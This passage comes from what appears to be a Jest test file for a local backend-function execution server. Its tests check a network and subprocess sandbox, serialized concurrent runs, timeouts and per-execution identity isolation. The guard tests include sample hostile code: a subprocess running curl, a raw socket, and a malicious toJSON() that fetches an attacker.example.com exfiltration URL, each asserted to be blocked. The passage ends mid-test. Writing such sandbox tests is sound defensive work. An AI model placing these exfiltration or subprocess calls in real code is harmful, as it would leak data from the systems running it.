                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModuleReturning({ example: () => undefined }),
                mockLogger,
            );
            expect(result).toEqual({ data: undefined });
        });

        // dev-server.ts serializes the result again for the HTTP response — returning the original (not the parsed round-trip) would invoke a custom toJSON() twice.
        test('Should return the JSON-round-tripped value, not the original, so a custom toJSON() is only invoked once', async () => {
            let toJsonCallCount = 0;
            const result = await executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModuleReturning({
                    example: () => ({
                        toJSON() {
                            toJsonCallCount += 1;
                            return { callNumber: toJsonCallCount };
                        },
                    }),
                }),
                mockLogger,
            );
            expect(result).toEqual({ data: { callNumber: 1 } });
            expect(toJsonCallCount).toBe(1);
        });
    });

    describe('network/subprocess guard', () => {
        test('Should reject when the customer function tries a raw net.Socket connection', async () => {
            await expect(
                executeScriptLocally(
                    func,
                    TEST_PROJECT_ROOT,
                    [],
                    stubExecuteAction,
                    loadModuleReturning({
                        example: () => {
                            // eslint-disable-next-line @typescript-eslint/no-require-imports
                            const net = require('net');
                            return new net.Socket().connect(80, 'example.com');
                        },
                    }),
                    mockLogger,
                ),
            ).rejects.toThrow(/Network access is not allowed/);
        });

        test('Should reject when the customer function tries a raw fetch() call', async () => {
            await expect(
                executeScriptLocally(
                    func,
                    TEST_PROJECT_ROOT,
                    [],
                    stubExecuteAction,
                    loadModuleReturning({ example: () => fetch('https://example.com') }),
                    mockLogger,
                ),
            ).rejects.toThrow(/Network access is not allowed/);
        });

        test('Should reject when the customer function tries to spawn a subprocess', async () => {
            await expect(
                executeScriptLocally(
                    func,
                    TEST_PROJECT_ROOT,
                    [],
                    stubExecuteAction,
                    loadModuleReturning({
                        example: () => {
                            // eslint-disable-next-line @typescript-eslint/no-require-imports
                            const child_process = require('child_process');
                            return child_process.execSync('curl https://example.com');
                        },
                    }),
                    mockLogger,
                ),
            ).rejects.toThrow(/Spawning a subprocess is not allowed/);
        });

        test('Should still let a real $.Actions call through while the rest of the function is network-blocked', async () => {
            const executeAction = jest.fn().mockResolvedValue({ ok: true });
            const result = await executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                executeAction,
                loadModuleReturning({
                    example: async () => {
                        const actionResult = await testDollar().Actions.slack.chat.postMessage({
                            inputs: { text: 'hi' },
                        });
                        // A raw fetch right after the sanctioned $.Actions call must still be blocked — the exemption is scoped to that one call.
                        await expect(fetch('https://example.com')).rejects.toThrow(
                            /Network access is not allowed/,
                        );
                        return actionResult;
                    },
                }),
                mockLogger,
            );
            expect(result).toEqual({ data: { ok: true } });
            expect(executeAction).toHaveBeenCalledWith(
                'com.datadoghq.slack.chat.postMessage',
                { text: 'hi' },
                undefined,
            );
        });

        test('Should block a malicious toJSON() on $.Actions inputs from making a real network call under cover of the exemption', async () => {
            // toJSON() must be synchronous, so its fetch attempt can't be awaited there — capture the outcome and assert once the whole execution settles.
            let fetchAttempt: Promise<unknown> | undefined;
            const maliciousInputs = {
                text: 'hi',
                toJSON() {
                    // Would resolve instead of rejecting if this ran inside runAllowed's window, meant only for the trusted preview-async call itself.
                    fetchAttempt = fetch('https://attacker.example.com/exfiltrate');
                    return { text: 'hi' };
                },
            };

            const result = await executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModuleReturning({
                    example: () =>
                        testDollar().Actions.slack.chat.postMessage({
                            inputs: maliciousInputs,
                        }),
                }),
                mockLogger,
            );

            expect(result).toEqual({ data: { data: null, stub: true, fqn: expect.any(String) } });
            expect(fetchAttempt).toBeDefined();
            await expect(fetchAttempt).rejects.toThrow(/Network access is not allowed/);
        });

        test('Should restore real network access after execution, for whatever the dev server itself does next', async () => {
            const realFetch = globalThis.fetch;
            await executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModuleReturning({ example: () => 'fine' }),
                mockLogger,
            );
            expect(globalThis.fetch).toBe(realFetch);
        });

        test('Should keep network access allowed through two real, overlapping $.Actions calls made concurrently via Promise.all, without either blocking the other mid-flight', async () => {
            // Proves the exemption holds through the real customer path (Promise.all → makeActionsProxy → runAllowed), not just at the unit level.
            const order: string[] = [];
            const executeAction: ExecuteAction = async (fqn) => {
                const label = fqn.includes('slow') ? 'slow' : 'fast';
                order.push(`${label}-start`);
                if (label === 'slow') {
                    await new Promise((r) => setTimeout(r, 20));
                }
                await fetch(`https://example.com/${label}`);
                order.push(`${label}-end`);
                return { ok: true, fqn };
            };

            const originalFetch = globalThis.fetch;
            const fetchMock = jest.fn().mockResolvedValue('ok');
            setGlobalFetch(fetchMock as unknown as typeof fetch);

            let result: { data: unknown };
            try {
                result = await executeScriptLocally(
                    func,
                    TEST_PROJECT_ROOT,
                    [],
                    executeAction,
                    loadModuleReturning({
                        example: () => {
                            const $ = testDollar();
                            return Promise.all([
                                $.Actions.slow.action({ inputs: {} }),
                                $.Actions.fast.action({ inputs: {} }),
                            ]);
                        },
                    }),
                    mockLogger,
                );
            } finally {
                setGlobalFetch(originalFetch);
            }

            expect(result.data).toEqual([
                { ok: true, fqn: 'com.datadoghq.slow.action' },
                { ok: true, fqn: 'com.datadoghq.fast.action' },
            ]);
            // The slow call's own fetch, made after the fast call's allow scope exited, must still resolve — network stayed allowed for it the whole time.
            expect(order).toEqual(['slow-start', 'fast-start', 'fast-end', 'slow-end']);
            expect(fetchMock).toHaveBeenCalledWith('https://example.com/slow');
            expect(fetchMock).toHaveBeenCalledWith('https://example.com/fast');
        });

        // The action-catalog callback must be exempted from the block like makeActionsProxy's apply trap — it runs from inside the blocked function.
        test("Should let a real network call through an action-catalog typed-wrapper call, not block it as if it were the customer's own code", async () => {
            jest.spyOn(shared, 'isActionCatalogInstalled').mockReturnValue(true);
            const executeAction: ExecuteAction = async (fqn, inputs) => {
                const response = await fetch('https://example.com/action-catalog');
                return { fqn, inputs, response };
            };

            let registeredImpl:
                | ((actionId: string, request: unknown) => Promise<unknown>)
                | undefined;
            const loadModule: LoadModule = async (specifier: string) => {
                if (specifier === func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX) {
                    return {
                        example: async () =>
                            registeredImpl?.('com.datadoghq.slack.chat.postMessage', {
                                inputs: { text: 'hi' },
                            }),
                    };
                }
                if (specifier === '@datadog/action-catalog/action-execution') {
                    return {
                        setExecuteActionImplementation: (
                            impl: (actionId: string, request: unknown) => Promise<unknown>,
                        ) => {
                            registeredImpl = impl;
                        },
                    };
                }
                const notFoundError: NodeJS.ErrnoException = new Error(
                    `Cannot find module '${specifier}'`,
                );
                notFoundError.code = 'MODULE_NOT_FOUND';
                throw notFoundError;
            };

            const originalFetch = globalThis.fetch;
            const fetchMock = jest.fn().mockResolvedValue('ok');
            setGlobalFetch(fetchMock as unknown as typeof fetch);

            let result: { data: unknown };
            try {
                result = await executeScriptLocally(
                    func,
                    TEST_PROJECT_ROOT,
                    [],
                    executeAction,
                    loadModule,
                    mockLogger,
                );
            } finally {
                setGlobalFetch(originalFetch);
            }

            expect(result.data).toEqual({
                fqn: 'com.datadoghq.slack.chat.postMessage',
                inputs: { text: 'hi' },
                response: 'ok',
            });
            expect(fetchMock).toHaveBeenCalledWith('https://example.com/action-catalog');
        });
    });

    describe('loadCustomerModuleEntry', () => {
        // Regression test: network-guard.ts's trustedStdout/trustedStderr are captured at that
        // module's own load time (see network-guard.ts). If the customer module's top-level code
        // ran first, it could repoint process.stdout before the guard ever captures it, permanently
        // defeating the write-blocking exemption check for every later execution in the process.
        // loadCustomerModuleEntry is the one choke point every caller (executeColdActionLocally's
        // priming, runScriptLocally's own fallback) funnels through, so asserting order here covers
        // every path. Isolates both modules fresh so the assertion isn't satisfied by network-guard
        // already having loaded from an earlier test in this file.
        test("Should await the network guard module before evaluating the customer module's top-level code", async () => {
            const calls: string[] = [];

            await jest.isolateModulesAsync(async () => {
                jest.doMock('./network-guard', () => {
                    calls.push('network-guard-loaded');
                    return {
                        runBlocked: async (fn: () => Promise<unknown>) => fn(),
                        runAllowed: async (fn: () => Promise<unknown>) => fn(),
                        forceReset: () => undefined,
                    };
                });

                const {
                    loadCustomerModuleEntry: isolatedLoadCustomerModuleEntry,
                } = require('./local-execution');

                const loadModule: LoadModule = async () => {
                    calls.push('customer-module-loaded');
                    return { example: () => 'done' };
                };

                const mod = await isolatedLoadCustomerModuleEntry(
                    loadModule,
                    func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX,
                );
                expect(mod).toEqual({ example: expect.any(Function) });
            });

            expect(calls).toEqual(['network-guard-loaded', 'customer-module-loaded']);
        });
    });

    describe('serialization of concurrent executions', () => {
        beforeEach(() => {
            delete (globalThis as Record<string, unknown>)[ORDER_MARKER];
        });

        function recordingOrder(label: string, delayMs: number): () => Promise<string> {
            return async () => {
                const marker =
                    ((globalThis as Record<string, unknown>)[ORDER_MARKER] as string[]) ?? [];
                (globalThis as Record<string, unknown>)[ORDER_MARKER] = marker;
                marker.push(`start-${label}`);
                await new Promise((r) => setTimeout(r, delayMs));
                marker.push(`end-${label}`);
                return label;
            };
        }

        test('Should never interleave two concurrent executions — the second never starts until the first fully finishes', async () => {
            const [resultA, resultB] = await Promise.all([
                executeScriptLocally(
                    func,
                    TEST_PROJECT_ROOT,
                    [],
                    stubExecuteAction,
                    loadModuleReturning({ example: recordingOrder('A', 20) }),
                    mockLogger,
                ),
                executeScriptLocally(
                    func,
                    TEST_PROJECT_ROOT,
                    [],
                    stubExecuteAction,
                    loadModuleReturning({ example: recordingOrder('B', 0) }),
                    mockLogger,
                ),
            ]);

            expect([resultA, resultB]).toEqual([{ data: 'A' }, { data: 'B' }]);
            const order = (globalThis as Record<string, unknown>)[ORDER_MARKER] as string[];
            // Whichever call runs first, its start/end pair must be adjacent — a real race would interleave as [start-A, start-B, end-B, end-A].
            expect(order).toEqual([
                expect.stringMatching(/^start-/),
                expect.stringMatching(/^end-/),
                expect.stringMatching(/^start-/),
                expect.stringMatching(/^end-/),
            ]);
            expect(order[0].slice('start-'.length)).toEqual(order[1].slice('end-'.length));
            expect(order[2].slice('start-'.length)).toEqual(order[3].slice('end-'.length));
        });

        function readOwnArgsAfterDelay(delayMs: number): () => Promise<unknown> {
            return () =>
                new Promise((resolve) =>
                    setTimeout(() => resolve(testDollar().backendFunctionArgs), delayMs),
                );
        }

        // globalThis.$ is scoped per call via AsyncLocalStorage, independent of the enqueue queue (which exists for the action-catalog/apps-backend module-singleton race).
        test("Should let each concurrent call see its OWN backendFunctionArgs via globalThis.$, not the other call's", async () => {
            const [resultA, resultB] = await Promise.all([
                executeScriptLocally(
                    func,
                    TEST_PROJECT_ROOT,
                    ['A-arg'],
                    stubExecuteAction,
                    loadModuleReturning({ example: readOwnArgsAfterDelay(20) }),
                    mockLogger,
                ),
                executeScriptLocally(
                    func,
                    TEST_PROJECT_ROOT,
                    ['B-arg'],
                    stubExecuteAction,
                    loadModuleReturning({ example: readOwnArgsAfterDelay(0) }),
                    mockLogger,
                ),
            ]);
            expect(resultA).toEqual({ data: ['A-arg'] });
            expect(resultB).toEqual({ data: ['B-arg'] });
        });

        test('Should still run the next queued execution after an earlier one rejects', async () => {
            const first = executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModuleReturning({
                    example: () => {
                        throw new Error('first fails');
                    },
                }),
                mockLogger,
            );
            const second = executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModuleReturning({ example: () => 2 }),
                mockLogger,
            );

            await expect(first).rejects.toThrow('first fails');
            await expect(second).resolves.toEqual({ data: 2 });
        });

        // Covers the raw-$.Actions path: a captured Actions reference must reject once abandoned, even after globalThis.$ is overwritten by a newer execution.
        test('Should reject a captured $.Actions reference once its own execution is abandoned, even after a newer execution has taken over', async () => {
            let abandonedCallOutcome: 'pending' | 'resolved' | { rejected: string } = 'pending';

            const abandoned = executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModuleReturning({
                    example: async () => {
                        // Captured BEFORE the timeout fires — this execution's own Actions proxy, not whatever globalThis.$ points to later.
                        const { Actions } = testDollar();
                        // Outlives the 20ms timeout below, so the caller already sees a rejection by the time this line runs.
                        await new Promise((resolve) => setTimeout(resolve, 100));
                        try {
                            await Actions.foo.bar({ inputs: {} });
                            abandonedCallOutcome = 'resolved';
                        } catch (err) {
                            abandonedCallOutcome = {
                                rejected: err instanceof Error ? err.message : String(err),
                            };
                        }
                        return { data: 'abandoned' };
                    },
                }),
                mockLogger,
                20,
            );
            await expect(abandoned).rejects.toThrow(/timed out after 20ms/);

            // The queue is free as soon as the timeout wins — the second execution starts and completes normally, becoming "current".
            const second = await executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModuleReturning({ example: () => 'second' }),
                mockLogger,
            );
            expect(second).toEqual({ data: 'second' });

            // Give the abandoned execution's background timer room to fire its action call before asserting on the outcome.
            await new Promise((resolve) => setTimeout(resolve, 100));

            expect(abandonedCallOutcome).toEqual({
                rejected: expect.stringContaining('already concluded'),
            });
        });

        test("Should resolve a zombie execution's FRESH read of globalThis.$ to its OWN identity, never a newer execution's — even while that newer execution is still in flight", async () => {
            const funcA: BackendFunction = { ...func, allowedConnectionIds: ['conn-A'] };
            const funcB: BackendFunction = { ...func, allowedConnectionIds: ['conn-B'] };
            const executeAction = jest.fn().mockResolvedValue({ ok: true });

            let zombieOutcome: 'pending' | 'resolved' | { rejected: string } = 'pending';

            const abandoned = executeScriptLocally(
                funcA,
                TEST_PROJECT_ROOT,
                [],
                executeAction,
                loadModuleReturning({
                    example: async () => {
                        // Fires ~60ms in, inside funcB's in-flight window — a fresh $ read here needs AsyncLocalStorage or it would resolve to funcB's $.
                        await new Promise((resolve) => setTimeout(resolve, 60));
                        const $ = testDollar();
                        try {
                            // funcB's own connectionId, not funcA's — only valid if this call incorrectly runs under funcB's still-live identity.
                            await $.Actions.foo.bar({ inputs: {}, connectionId: 'conn-B' });
                            zombieOutcome = 'resolved';
                        } catch (err) {
                            zombieOutcome = {
                                rejected: err instanceof Error ? err.message : String(err),
                            };
                        }
                        return 'zombie-done';
                    },
                }),
                mockLogger,
                20,
            );
            await expect(abandoned).rejects.toThrow(/timed out after 20ms/);

            // Stays "current" for 80ms, overlapping the zombie's 60ms wakeup; never calls $.Actions itself, so any observed call must be the zombie's.
            const second = executeScriptLocally(
                funcB,
                TEST_PROJECT_ROOT,
                [],
                executeAction,
                loadModuleReturning({
                    example: async () => {
                        await new Promise((resolve) => setTimeout(resolve, 80));
                        return 'second';
                    },
                }),
                mockLogger,
            );
            await expect(second).resolves.toEqual({ data: 'second' });

            // The zombie's fresh read resolved to its own $ (funcA's allowedConnectionIds), so funcB's connectionId is rejected before reaching executeAction.
            expect(zombieOutcome).toEqual({
                rejected: expect.stringContaining("not in this function's allowed connections"),
            });
            expect(executeAction).not.toHaveBeenCalled();
        });

        // The dispatcher resolves the calling execution's dispatch from AsyncLocalStorage at call time — a per-closure guard alone would be bypassed once a newer execution re-registers.
        test("Should reject an abandoned execution's action-catalog typed-wrapper call, not silently run it under a newer registration", async () => {
            jest.spyOn(shared, 'isActionCatalogInstalled').mockReturnValue(true);
            let abandonedCallOutcome: 'pending' | 'resolved' | { rejected: string } = 'pending';
            let registeredImpl:
                | ((actionId: string, request: unknown) => Promise<unknown>)
                | undefined;

            const loadModule: LoadModule = async (specifier: string) => {
                if (specifier === func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX) {
                    return {
                        example: async () => {
                            await new Promise((resolve) => setTimeout(resolve, 100));
                            try {
                                await registeredImpl?.('com.datadoghq.foo.bar', { inputs: {} });
                                abandonedCallOutcome = 'resolved';
                            } catch (err) {
                                abandonedCallOutcome = {
                                    rejected: err instanceof Error ? err.message : String(err),
                                };
                            }
                            return { data: 'abandoned' };
                        },
                    };
                }
                if (specifier === '@datadog/action-catalog/action-execution') {
                    return {
                        setExecuteActionImplementation: (
                            impl: (actionId: string, request: unknown) => Promise<unknown>,
                        ) => {
                            registeredImpl = impl;
                        },
                    };
                }
                const notFoundError: NodeJS.ErrnoException = new Error(
                    `Cannot find module '${specifier}'`,
                );
                notFoundError.code = 'MODULE_NOT_FOUND';
                throw notFoundError;
            };

            const abandoned = executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModule,
                mockLogger,
                20,
            );
            await expect(abandoned).rejects.toThrow(/timed out after 20ms/);

            // No second execution registers here — the call is rejected because the dispatcher resolves this execution's own dispatch, already concluded by the 20ms timeout.
            await new Promise((resolve) => setTimeout(resolve, 100));

            expect(abandonedCallOutcome).toEqual({
                rejected: expect.stringContaining('already concluded'),
            });
        });

        // registeredImpl points at funcB's registration once it registers, but a call from within funcA's own continuation must still resolve funcA's concluded dispatch via AsyncLocalStorage and be rejected, not routed through funcB's identity.
        test("Should reject a zombie execution's action-catalog typed-wrapper call even after a newer execution has legitimately re-registered its own implementation", async () => {
            jest.spyOn(shared, 'isActionCatalogInstalled').mockReturnValue(true);
            const funcA: BackendFunction = { ...func, allowedConnectionIds: ['conn-A'] };
            const funcB: BackendFunction = { ...func, allowedConnectionIds: ['conn-B'] };
            const executeAction = jest.fn().mockResolvedValue({ ok: true });
            let registeredImpl:
                | ((actionId: string, request: unknown) => Promise<unknown>)
                | undefined;
            let zombieOutcome: 'pending' | 'resolved' | { rejected: string } = 'pending';

            const makeLoadModule = (exampleImpl: () => Promise<unknown>): LoadModule => {
                return async (specifier: string) => {
                    if (specifier === func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX) {
                        return { example: exampleImpl };
                    }
                    if (specifier === '@datadog/action-catalog/action-execution') {
                        return {
                            setExecuteActionImplementation: (
                                impl: (actionId: string, request: unknown) => Promise<unknown>,
                            ) => {
                                registeredImpl = impl;
                            },
                        };
                    }
                    const notFoundError: NodeJS.ErrnoException = new Error(
                        `Cannot find module '${specifier}'`,
                    );
                    notFoundError.code = 'MODULE_NOT_FOUND';
                    throw notFoundError;
                };
            };

            // Times out at 20ms, then calls the typed wrapper ~60ms in — inside funcB's in-flight window — using conn-B, a connection funcA is never allowed to use.
            const abandoned = executeScriptLocally(
                funcA,
                TEST_PROJECT_ROOT,
                [],
                executeAction,
                makeLoadModule(async () => {
                    await new Promise((resolve) => setTimeout(resolve, 60));
                    try {
                        await registeredImpl?.('com.datadoghq.foo.bar', {
                            inputs: {},
                            connectionId: 'conn-B',
                        });
                        zombieOutcome = 'resolved';
                    } catch (err) {
                        zombieOutcome = {
                            rejected: err instanceof Error ? err.message : String(err),
                        };
                    }
                    return 'zombie-done';
                }),
                mockLogger,
                20,
            );
            await expect(abandoned).rejects.toThrow(/timed out after 20ms/);

            // Starts as soon as the queue frees, registers immediately, but doesn't conclude until 80ms — overlapping funcA's 60ms zombie wakeup.
            const second = executeScriptLocally(
                funcB,
                TEST_PROJECT_ROOT,
                [],
                executeAction,
                makeLoadModule(() => new Promise((resolve) => setTimeout(() => resolve('B'), 80))),
                mockLogger,
            );
            await expect(second).resolves.toEqual({ data: 'B' });

            // funcB's own registration checks conn-B against funcB's allowedConnectionIds, which passes — the zombie call must not be allowed to reach that registration at all.
            expect(zombieOutcome).toEqual({
                rejected: expect.stringContaining('already concluded'),
            });
            expect(executeAction).not.toHaveBeenCalled();
        });

        // The apps-backend loadModule hangs forever, so a post-Promise.all destructuring would never run — publishing each handle via its own .then() is what lets the completed action-catalog registration still take effect.
        test('Should still register the action-catalog adapter even when the sibling apps-backend registration never settles, and reject a call once no execution is active', async () => {
            jest.spyOn(shared, 'isActionCatalogInstalled').mockReturnValue(true);
            jest.spyOn(shared, 'isDatadogAppsBackendInstalled').mockReturnValue(true);
            let registeredImpl:
                | ((actionId: string, request: unknown) => Promise<unknown>)
                | undefined;

            const loadModule: LoadModule = async (specifier: string) => {
                if (specifier === func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX) {
                    return { example: () => 'unused' };
                }
                if (specifier === '@datadog/action-catalog/action-execution') {
                    return {
                        setExecuteActionImplementation: (
                            impl: (actionId: string, request: unknown) => Promise<unknown>,
                        ) => {
                            registeredImpl = impl;
                        },
                    };
                }
                if (
                    specifier === '@datadog/apps-backend/runtime/jsFunctionWithActions' ||
                    specifier === '@datadog/apps-backend/runtime'
                ) {
                    return new Promise(() => {});
                }
                const notFoundError: NodeJS.ErrnoException = new Error(
                    `Cannot find module '${specifier}'`,
                );
                notFoundError.code = 'MODULE_NOT_FOUND';
                throw notFoundError;
            };

            const abandoned = executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModule,
                mockLogger,
                20,
            );
            await expect(abandoned).rejects.toThrow(/timed out after 20ms/);

            expect(registeredImpl).toBeDefined();
            await expect(registeredImpl?.('com.datadoghq.foo.bar', { inputs: {} })).rejects.toThrow(
                /no active local execution/i,
            );
        });

        // Deliberately reuses one loadModule across both calls (not the usual per-call closure) — a real dev server does the same, so a load that never settles must not permanently poison later executions sharing it.
        test('Should let a later execution register and run after an earlier one shared the same loadModule with a registration load that never settles', async () => {
            jest.spyOn(shared, 'isActionCatalogInstalled').mockReturnValue(true);

            let actionCatalogLoadCount = 0;
            const loadModule: LoadModule = async (specifier: string) => {
                if (specifier === func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX) {
                    return { example: () => 'ok' };
                }
                if (specifier === '@datadog/action-catalog/action-execution') {
                    actionCatalogLoadCount += 1;
                    if (actionCatalogLoadCount === 1) {
                        // Simulates a genuinely broken/circular module graph, not just a slow one.
                        return new Promise(() => {});
                    }
                    return { setExecuteActionImplementation: () => {} };
                }
                const notFoundError: NodeJS.ErrnoException = new Error(
                    `Cannot find module '${specifier}'`,
                );
                notFoundError.code = 'MODULE_NOT_FOUND';
                throw notFoundError;
            };

            const first = executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModule,
                mockLogger,
                20,
            );
            await expect(first).rejects.toThrow(/timed out after 20ms/);

            // Gives the first attempt's own registration timeout (also ~20ms, started microseconds after
            // the execution's own timeout above) room to fire and evict its cache entry, the same way a
            // real dev server's next request would naturally arrive well after that — not racing the two.
            await new Promise((resolve) => setTimeout(resolve, 30));

            // Without evicting the first attempt's still-pending registration, this would hang until it also times out — never actually invoking its own function.
            const second = await executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                loadModule,
                mockLogger,
                50,
            );
            expect(second).toEqual({ data: 'ok' });
        });

        // An abandoned execution's fn() can settle normally later — its finally block's conclude step must not disturb whatever a newer execution's own registration already put in place.
        test("Should not let a late-settling abandoned execution's own conclusion clobber a newer execution's already-registered action-catalog implementation", async () => {
            jest.spyOn(shared, 'isActionCatalogInstalled').mockReturnValue(true);
            let registeredImpl:
                | ((actionId: string, request: unknown) => Promise<unknown>)
                | undefined;

            const makeLoadModule = (exampleImpl: () => Promise<unknown>): LoadModule => {
                return async (specifier: string) => {
                    if (specifier === func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX) {
                        return { example: exampleImpl };
                    }
                    if (specifier === '@datadog/action-catalog/action-execution') {
                        return {
                            setExecuteActionImplementation: (
                                impl: (actionId: string, request: unknown) => Promise<unknown>,
                            ) => {
                                registeredImpl = impl;
                            },
                        };
                    }
                    const notFoundError: NodeJS.ErrnoException = new Error(
                        `Cannot find module '${specifier}'`,
                    );
                    notFoundError.code = 'MODULE_NOT_FOUND';
                    throw notFoundError;
                };
            };

            // Times out at 20ms, but its own fn() resolves normally ~100ms later, well after being abandoned.
            const abandoned = executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                makeLoadModule(
                    () => new Promise((resolve) => setTimeout(() => resolve('A-late'), 100)),
                ),
                mockLogger,
                20,
            );
            await expect(abandoned).rejects.toThrow(/timed out after 20ms/);

            // The queue is free as soon as the timeout wins — the second execution registers and finishes well before the abandoned one's 100ms sleep is up.
            const second = await executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                makeLoadModule(() => Promise.resolve('B')),
                mockLogger,
            );
            expect(second).toEqual({ data: 'B' });

            // Captures whatever B's own conclusion left registered — B's own registration staying in place after it concludes is fine; nothing else must overwrite it.
            const registeredAfterB = registeredImpl;

            // Give the abandoned execution's late-settling fn() and its finally block room to run.
            await new Promise((resolve) => setTimeout(resolve, 100));

            expect(registeredImpl).toBe(registeredAfterB);
        });

        // A's slow-to-resolve registration re-installs the same stable dispatcher B already put in place — harmless, since either closure resolves a call against whichever execution is on the AsyncLocalStorage call stack, not against whichever registered it.
        test("Should still dispatch correctly after a stale execution's slow-to-resolve registration re-installs the adapter following a newer execution's own registration", async () => {
            jest.spyOn(shared, 'isActionCatalogInstalled').mockReturnValue(true);
            let registeredImpl:
                | ((actionId: string, request: unknown) => Promise<unknown>)
                | undefined;

            const makeLoadModule = (actionCatalogDelayMs: number): LoadModule => {
                return async (specifier: string) => {
                    if (specifier === func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX) {
                        return { example: () => 'result' };
                    }
                    if (specifier === '@datadog/action-catalog/action-execution') {
                        if (actionCatalogDelayMs > 0) {
                            await new Promise((resolve) =>
                                setTimeout(resolve, actionCatalogDelayMs),
                            );
                        }
                        return {
                            setExecuteActionImplementation: (
                                impl: (actionId: string, request: unknown) => Promise<unknown>,
                            ) => {
                                registeredImpl = impl;
                            },
                        };
                    }
                    const notFoundError: NodeJS.ErrnoException = new Error(
                        `Cannot find module '${specifier}'`,
                    );
                    notFoundError.code = 'MODULE_NOT_FOUND';
                    throw notFoundError;
                };
            };

            // Times out at 20ms, well before its own 100ms-delayed action-catalog module load resolves.
            const abandoned = executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                makeLoadModule(100),
                mockLogger,
                20,
            );
            await expect(abandoned).rejects.toThrow(/timed out after 20ms/);

            // The queue is free as soon as the timeout wins — the second execution registers with no artificial delay, well before A's slow load resolves.
            const second = await executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                makeLoadModule(0),
                mockLogger,
            );
            expect(second).toEqual({ data: 'result' });

            // Give A's slow action-catalog load room to finally resolve and re-install the adapter.
            await new Promise((resolve) => setTimeout(resolve, 150));

            // No execution is active at this point — either closure instance correctly rejects the same way.
            await expect(registeredImpl?.('com.datadoghq.foo.bar', { inputs: {} })).rejects.toThrow(
                /no active local execution/i,
            );
        });

        // Neither the module load nor the registration individually exceeds its own timeout budget, but their SUM crosses the outer timeout — proves the specific "abandoned ... before it could start" rejection fires (and is logged) for this cumulative-delay case, not just an individual step timing out.
        test("Should log 'abandoned ... before it could start' when cumulative module-load + registration delay crosses the timeout, without either step individually exceeding it", async () => {
            jest.spyOn(shared, 'isActionCatalogInstalled').mockReturnValue(true);
            const loadModule: LoadModule = async (specifier: string) => {
                if (specifier === func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX) {
                    // Well under the 20ms timeout on its own.
                    await new Promise((resolve) => setTimeout(resolve, 12));
                    return { example: () => 'should never run' };
                }
                if (specifier === '@datadog/action-catalog/action-execution') {
                    // Also well under 20ms on its own, but by now ~24ms have elapsed since scope.start().
                    await new Promise((resolve) => setTimeout(resolve, 12));
                    return { setExecuteActionImplementation: () => {} };
                }
                const notFoundError: NodeJS.ErrnoException = new Error(
                    `Cannot find module '${specifier}'`,
                );
                notFoundError.code = 'MODULE_NOT_FOUND';
                throw notFoundError;
            };

            await expect(
                executeScriptLocally(
                    func,
                    TEST_PROJECT_ROOT,
                    [],
                    stubExecuteAction,
                    loadModule,
                    mockLogger,
                    20,
                ),
            ).rejects.toThrow(/timed out after 20ms/);

            // Give registration room to resolve and run()'s own rejection to be logged.
            await new Promise((resolve) => setTimeout(resolve, 40));

            expect(mockLogFn).toHaveBeenCalledWith(
                expect.stringContaining('was abandoned after timing out before it could start'),
                'debug',
            );
        });

        // An abandoned execution's loadModule/registration steps might still resolve after timeout — proves the customer function is never invoked once already known-stale.
        test('Should never invoke the customer function once already known to be abandoned before it starts', async () => {
            let callCount = 0;
            const slowLoadModule: LoadModule = async (specifier: string) => {
                if (specifier === func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX) {
                    // Slower than the 20ms timeout below — by the time this resolves, the execution is already known-abandoned.
                    await new Promise((resolve) => setTimeout(resolve, 100));
                    return {
                        example: () => {
                            callCount += 1;
                            return 'should never run';
                        },
                    };
                }
                const notFoundError: NodeJS.ErrnoException = new Error(
                    `Cannot find module '${specifier}'`,
                );
                notFoundError.code = 'MODULE_NOT_FOUND';
                throw notFoundError;
            };

            const abandoned = executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                slowLoadModule,
                mockLogger,
                20,
            );
            await expect(abandoned).rejects.toThrow(/timed out after 20ms/);

            // Give the slow loadModule call room to actually resolve.
            await new Promise((resolve) => setTimeout(resolve, 100));

            expect(callCount).toBe(0);
        });

        // An abandoned execution's loadModule can resolve late, after a newer one is already inside the guards — it must not corrupt the newer state.
        test("Should never let an abandoned execution's late-resolving loadModule enter the network/env guards while a newer execution is still inside them", async () => {
            const makeLoadModule = (mainDelayMs: number): LoadModule => {
                return async (specifier: string) => {
                    if (specifier === func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX) {
                        if (mainDelayMs > 0) {
                            await new Promise((resolve) => setTimeout(resolve, mainDelayMs));
                        }
                        return {
                            example: async () => {
                                // B's own body: still running when A's slow loadModule resolves, so any state A corrupts on its way in would be visible here.
                                await new Promise((resolve) => setTimeout(resolve, 200));
